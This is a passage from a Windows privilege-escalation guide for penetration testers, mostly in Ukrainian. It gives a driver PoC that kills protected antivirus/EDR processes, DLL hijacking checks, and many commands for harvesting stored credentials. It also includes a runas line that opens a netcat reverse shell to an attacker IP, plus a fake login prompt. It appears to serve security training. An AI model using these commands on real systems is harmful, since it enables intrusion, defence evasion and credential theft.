- Необмежений raw disk read/write (offline tampering, boot-time persistence tricks).
- Завершувати arbitrary processes, включно з Protected Process/Light (PP/PPL), що дозволяє AV/EDR kill з user land через kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Заходи пом'якшення для розробників
- Завжди встановлюйте FILE_DEVICE_SECURE_OPEN при створенні об'єктів пристрою, які мають бути обмежені DACL.
- Перевіряйте контекст викликача для привілейованих операцій. Додавайте PP/PPL перевірки перед дозволом завершення процесу або повернення дескрипторів.
- Обмежуйте IOCTLs (access masks, METHOD_*, перевірка вхідних даних) та розглядайте brokered models замість direct kernel privileges.

Ідеї виявлення для захисників
- Моніторте user-mode відкриття підозрілих імен пристроїв (наприклад, \\ .\\amsdk*) та специфічні послідовності IOCTL, що вказують на зловживання.
- Застосовуйте Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) та підтримуйте власні списки дозволених/заборонених.

## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Для отримання додаткової інформації про те, як зловживати цією перевіркою:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Мережа

### Спільні папки
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Перевірте наявність інших відомих комп'ютерів, жорстко прописаних у hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Мережеві інтерфейси та DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

Перевірте **restricted services** ззовні
```bash
netstat -ano #Opened ports?
```
### Таблиця маршрутизації
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP таблиця
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Правила Firewall

[**Перегляньте цю сторінку для команд, пов'язаних із Firewall**](../basic-cmd-for-pentesters.md#firewall) **(перелічити правила, створити правила, вимкнути, вимкнути...)**

Більше[ команд для network enumeration тут](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Бінарний файл `bash.exe` також можна знайти в `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Якщо ви отримаєте користувача root, ви можете прослуховувати будь-який порт (вперше, коли ви використовуєте `nc.exe` для прослуховування порту, воно запитає через GUI, чи слід дозволити `nc` у брандмауері).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Щоб легко запустити bash як root, можна спробувати `--default-user root`

Ви можете дослідити файлову систему `WSL` у папці `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Облікові дані Windows

### Облікові дані Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Менеджер облікових даних / Windows Vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault зберігає облікові дані користувачів для серверів, вебсайтів та інших програм, до яких **Windows** може **автоматично входити від імені користувачів**. На перший погляд може здатися, що користувачі можуть зберігати свої облікові дані Facebook, Twitter, Gmail тощо, щоб автоматично входити через браузери. Але це не так.

Windows Vault зберігає облікові дані, за допомогою яких Windows може автоматично входити від імені користувачів, що означає, що будь-який **Windows application that needs credentials to access a resource** (сервер або вебсайт) **can make use of this Credential Manager** & Windows Vault і використовувати надані облікові дані замість того, щоб користувачі постійно вводили ім'я користувача та пароль.

Якщо застосунки не взаємодіють з Credential Manager, я не вважаю, що вони зможуть використати облікові дані для певного ресурсу. Тому, якщо ваш додаток хоче використовувати сховище, він має якимось чином **комунікувати з credential manager і запитувати облікові дані для цього ресурсу** з дефолтного сховища.

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Після цього ви можете використовувати `runas` з опцією `/savecred`, щоб скористатися збереженими обліковими даними. У наступному прикладі викликається віддалений бінарний файл через SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Використання `runas` з наданими обліковими даними.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Зауважте, що mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), або через [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)** забезпечує метод симетричного шифрування даних, переважно використовуваний у Windows для симетричного шифрування асиметричних приватних ключів. Це шифрування використовує секрет користувача або системи як істотний внесок у ентропію.

**DPAPI дозволяє шифрувати ключі через симетричний ключ, який похідний від секретів входу користувача**. У випадках системного шифрування він використовує секрети автентифікації домену системи.

Зашифровані RSA-ключі користувача за допомогою DPAPI зберігаються в директорії `%APPDATA%\Microsoft\Protect\{SID}`, де `{SID}` відповідає [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) користувача. **Ключ DPAPI, розташований разом із головним ключем, що захищає приватні ключі користувача в тому ж файлі**, зазвичай складається з 64 байтів випадкових даних. (Варто зауважити, що доступ до цієї директорії обмежений, через що перерахувати її вміст за допомогою команди `dir` у CMD неможливо, хоча її можна переглянути через PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Ви можете використати **mimikatz module** `dpapi::masterkey` з відповідними аргументами (`/pvk` або `/rpc`) щоб розшифрувати його.

The **credentials files protected by the master password** are usually located in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Ви можете використовувати **mimikatz module** `dpapi::cred` з відповідним `/masterkey` для розшифрування.\
Ви можете **витягнути багато DPAPI** **masterkeys** з **memory** за допомогою модуля `sekurlsa::dpapi` (якщо ви root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** часто використовуються для сценаріїв та задач автоматизації як зручний спосіб зберігання зашифрованих облікових даних. Облікові дані захищені за допомогою **DPAPI**, що зазвичай означає, що їх можна розшифрувати лише тим самим користувачем на тому самому комп’ютері, на якому вони були створені.

Щоб **розшифрувати** PS credentials з файлу, який їх містить, ви можете:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wi-Fi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Збережені RDP-підключення

Ви можете знайти їх у `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
і в `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Нещодавно виконані команди
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Диспетчер облікових даних віддаленого робочого столу**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
Ви можете **витягти багато DPAPI masterkeys** з пам'яті за допомогою модуля Mimikatz `sekurlsa::dpapi`

### Sticky Notes

Люди часто використовують додаток StickyNotes на Windows робочих станціях, щоб **зберігати паролі** та іншу інформацію, не усвідомлюючи, що це файл бази даних. Цей файл розташований за адресою `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` і завжди варто його шукати та переглядати.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** знаходиться в каталозі `%systemroot%\system32\inetsrv\`.\  
Якщо цей файл існує, то можливо, що деякі **credentials** були налаштовані і можуть бути **відновлені**.

Цей код було витягнуто з [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Перевірте, чи існує `C:\Windows\CCM\SCClient.exe` .\
Інсталятори **run with SYSTEM privileges**, багато з них вразливі до **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Файли та реєстр (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH ключі хоста
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys у реєстрі

SSH private keys можуть зберігатися в ключі реєстру `HKCU\Software\OpenSSH\Agent\Keys`, тож варто перевірити, чи є там щось цікаве:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Якщо ви знайдете будь-який запис у цьому каталозі, це, ймовірно, збережений SSH-ключ. Він зберігається у зашифрованому вигляді, але його можна легко розшифрувати за допомогою [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Детальніше про цю техніку тут: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Якщо служба `ssh-agent` не запущена і ви хочете, щоб вона автоматично запускалася при завантаженні, виконайте:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Схоже, ця техніка більше не дійсна. Я намагався створити деякі ssh keys, додати їх за допомогою `ssh-add` і увійти по ssh на машину. Регістр HKCU\Software\OpenSSH\Agent\Keys не існує і procmon не виявив використання `dpapi.dll` під час аутентифікації асиметричного ключа.

### Файли без нагляду
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Ви також можете шукати ці файли за допомогою **metasploit**: _post/windows/gather/enum_unattend_

Приклад вмісту:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Резервні копії SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Хмарні облікові дані
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Шукайте файл під назвою **SiteList.xml**

### Кешований пароль GPP

Раніше існувала можливість розгортати кастомні локальні облікові записи адміністратора на групі машин через Group Policy Preferences (GPP). Однак цей метод мав серйозні проблеми з безпекою. По-перше, Group Policy Objects (GPOs), що зберігаються у вигляді XML-файлів у SYSVOL, були доступні будь-якому користувачу домену. По-друге, паролі в цих GPP, зашифровані AES256 з використанням загальнодокументованого стандартного ключа, могли бути розшифровані будь-яким автентифікованим користувачем. Це становило серйозний ризик, оскільки могло дозволити користувачам отримати підвищені привілеї.

Щоб зменшити цей ризик, була розроблена функція для сканування локально кешованих GPP-файлів, що містять поле "cpassword", яке не є пустим. Знайшовши такий файл, функція розшифровує пароль та повертає кастомний PowerShell-об'єкт. Цей об'єкт містить деталі про GPP і місцезнаходження файлу, що допомагає ідентифікувати та виправити цю вразливість.

Шукайте в `C:\ProgramData\Microsoft\Group Policy\history` або в _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (до W Vista)_ наступні файли:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Щоб розшифрувати cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Використання crackmapexec для отримання паролів:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Приклад web.config з обліковими даними:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN облікові дані
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Журнали
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Попросіть credentials

Ви завжди можете **попросити користувача ввести його credentials або навіть credentials іншого користувача**, якщо вважаєте, що він може їх знати (зауважте, що пряме **прохання** клієнта надати **credentials** є справді **ризикованим**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Можливі імена файлів, що містять credentials**

Відомі файли, які деякий час тому містили **passwords** у **clear-text** або **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Пошук у всіх запропонованих файлах:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials у RecycleBin

Також слід перевірити Bin на наявність credentials.

Для **відновлення паролів**, збережених кількома програмами, ви можете використовувати: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### У реєстрі

**Інші можливі ключі реєстру з credentials**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Історія браузерів

Перевірте бази даних, де зберігаються паролі від **Chrome або Firefox**.\
Також перевірте історію, закладки та вибране браузерів, оскільки там можуть зберігатися **паролі**.

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** — це технологія, вбудована в операційну систему Windows, яка дозволяє **взаємодію** між програмними компонентами, написаними різними мовами. Кожен COM-компонент **ідентифікується за class ID (CLSID)**, а функціональність кожного компонента надається через один або кілька інтерфейсів, ідентифікованих за interface IDs (IIDs).

COM-класи та інтерфейси визначені в реєстрі під ключами **HKEY\CLASSES\ROOT\CLSID** та **HKEY\CLASSES\ROOT\Interface** відповідно. Цей розділ реєстру формується шляхом об’єднання **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Всередині записів CLSID у цьому розділі ви можете знайти дочірній ключ **InProcServer32**, який містить **значення за замовчуванням**, що вказує на **DLL**, а також значення **ThreadingModel**, яке може бути **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) або **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

По суті, якщо ви можете **перезаписати будь-яку з DLL**, яка буде виконана, ви зможете **ескалювати привілеї**, якщо ця DLL виконуватиметься іншим користувачем.

Щоб дізнатися, як нападники використовують COM Hijacking як механізм персистенції, перегляньте:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Пошук вмісту файлів**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Пошук файлу з певним іменем**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Шукайте в реєстрі імена ключів та паролі**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Інструменти для пошуку passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** плагін. Я створив цей плагін, щоб **automatically execute every metasploit POST module that searches for credentials** всередині жертви.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) автоматично шукає всі файли, що містять passwords, згадані на цій сторінці.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) — ще один відмінний інструмент для витягання password із системи.

Інструмент [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) шукає **sessions**, **usernames** і **passwords** у кількох програмах, що зберігають ці дані у clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Уявіть собі, що **процес, запущений як SYSTEM, відкриває новий процес** (`OpenProcess()`) з **повним доступом**. Той самий процес **також створює новий процес** (`CreateProcess()`) **з низькими привілеями, але успадковуючи всі відкриті дескриптори головного процесу**.\
Тоді, якщо у вас є **повний доступ до низькоправневого процесу**, ви можете захопити **відкритий handle на створений привілейований процес** через `OpenProcess()` і **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Сегменти спільної пам'яті, відомі як **pipes**, дозволяють процесам обмінюватися даними та передавати інформацію.

Windows надає функцію під назвою **Named Pipes**, яка дозволяє незалежним процесам обмінюватися даними навіть через різні мережі. Це схоже на архітектуру клієнт/сервер, де ролі визначені як **named pipe server** та **named pipe client**.

Коли дані надсилаються через pipe від **client**, **server**, який створив pipe, має можливість **прийняти ідентичність** **client**, за наявності необхідних прав **SeImpersonate**. Ідентифікація **привілейованого процесу**, який спілкується через pipe, що ви можете імітувати, дає можливість **отримати вищі привілеї**, набувши ідентичності цього процесу, коли він взаємодіє з pipe, який ви створили. Для інструкцій щодо виконання такої атаки корисні керівництва можна знайти [**here**](named-pipe-client-impersonation.md) та [**here**](#from-high-integrity-to-system).

Також наступний інструмент дозволяє **перехоплювати комунікацію named pipe за допомогою інструменту, такого як burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **і цей інструмент дозволяє перелічити та переглянути всі pipes для пошуку privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
